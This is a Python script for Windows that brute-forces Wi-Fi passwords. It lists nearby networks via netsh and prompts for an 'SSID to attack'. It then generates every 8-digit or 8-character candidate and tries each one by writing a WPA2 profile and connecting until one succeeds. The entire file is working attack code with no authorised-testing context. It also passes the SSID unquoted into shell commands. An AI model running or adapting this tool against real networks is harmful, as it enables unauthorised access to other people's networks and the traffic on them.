import itertools
import string
import subprocess
import time
import os
import re
import gc

# ------------------------ Password Generators ------------------------

def generate_8_digit_numbers():
    for num in range(100_000_000):
        yield f"{num:08d}"

def generate_8_char_special_combinations():
    special_chars = "!@#$%^&*()_+-=[]{}|;:',.<>/?"
    chars = string.digits + special_chars
    specials_set = set(special_chars)
    for combo in itertools.product(chars, repeat=8):
        if any(c in specials_set for c in combo):
            yield ''.join(combo)

def generate_8_char_alphanum_combinations():
    chars = string.ascii_letters + string.digits
    for combo in itertools.product(chars, repeat=8):
        yield ''.join(combo)

# ------------------------ Wi-Fi Tools ------------------------

def list_wifi_networks():
    print("\n📡 Scanning available Wi-Fi networks...\n")
    try:
        output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, text=True)
        lines = output.splitlines()

        networks = []
        seen = set()
        current_ssid = None
        current_auth = None
        current_encrypt = None
        signal = None

        for line in lines:
            line = line.strip()

            if line.startswith("SSID ") and " : " in line:
                ssid = line.split(" : ", 1)[1].strip()
                if ssid in seen or ssid == "":
                    current_ssid = None
                    continue
                current_ssid = ssid
                seen.add(ssid)
                current_auth = None
                current_encrypt = None
                signal = None

            elif current_ssid:
                if "Authentication" in line:
                    current_auth = line.split(":", 1)[1].strip()
                elif "Encryption" in line:
                    current_encrypt = line.split(":", 1)[1].strip()
                elif "Signal" in line and signal is None:
                    signal_match = re.search(r"(\d+)%", line)
                    if signal_match:
                        signal = int(signal_match.group(1))
                    else:
                        signal = "Unknown"
                    networks.append((current_ssid, current_auth or "Unknown", current_encrypt or "Unknown", signal))
                    current_ssid = None

        networks.sort(key=lambda x: x[3] if isinstance(x[3], int) else 0, reverse=True)

        for i, (ssid, auth, encryption, signal) in enumerate(networks, start=1):
            print(f"{i}. SSID: {ssid} | Security: {auth}/{encryption} | Signal: {signal}%")

        return [ssid for ssid, *_ in networks]

    except subprocess.CalledProcessError as e:
        print(f"❌ Error scanning networks: {e}")
        return []

def create_wifi_profile_xml(ssid, password, filename="wifi_profile.xml"):
    xml_template = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"""
    with open(filename, "w") as f:
        f.write(xml_template)
    return filename

def connect_to_wifi(ssid, password):
    xml_file = create_wifi_profile_xml(ssid, password)
    try:
        subprocess.check_call(f'netsh wlan add profile filename="{xml_file}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.check_call(f'netsh wlan connect name="{ssid}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        status_output = subprocess.check_output('netsh wlan show interfaces', shell=True, text=True)
        connected_match = re.search(r"^\s*State\s*:\s*connected\s*$", status_output, re.MULTILINE | re.IGNORECASE)
        ssid_match = re.search(r"^\s*SSID\s*:\s*(.+)$", status_output, re.MULTILINE)
        if connected_match and ssid_match:
            connected_ssid = ssid_match.group(1).strip()
            if connected_ssid == ssid:
                print(f"\n✅ Connected to {ssid} using password: {password}")
                return True
        print("❌ Wrong password or connection failed.")
        return False
    except subprocess.CalledProcessError:
        return False
    finally:
        if os.path.exists(xml_file):
            os.remove(xml_file)

# ------------------------ Main Brute-Force Logic ------------------------

def main():
    networks = list_wifi_networks()
    if not networks:
        print("⚠️ No networks found.")
        return

    ssid = input("\n🔑 Enter SSID to attack: ").strip()
    if ssid not in networks:
        print("❌ SSID not found in list.")
        return

    print("\nChoose password generation mode:")
    print("1. 8-digit numbers (00000000–99999999)")
    print("2. 8-char (digits + special chars, at least 1 special)")
    print("3. 8-char alphanumeric (A-Z, a-z, 0-9)")

    mode = input("Enter 1, 2, or 3: ").strip()
   # l=int(input("guess the length of the pwd"))
    if mode == "1":
        generator = generate_8_digit_numbers()
    elif mode == "2":
        generator = generate_8_char_special_combinations()
    elif mode == "3":
        generator = generate_8_char_alphanum_combinations()
    else:
        print("❌ Invalid option.")
        return

    print("\n🚀 Starting brute-force... Press Ctrl+C to stop.\n")
    try:
        count = 0
        for password in generator:
            count += 1
            print(f"🔍 Trying password #{count}: {password}")
            if connect_to_wifi(ssid, password):
                print("🎉 Password found!")
                break
            if count % 1_000 == 0:
                gc.collect()
    except KeyboardInterrupt:
        print("\n⛔ Brute-force interrupted by user.")

if __name__ == "__main__":
    main()
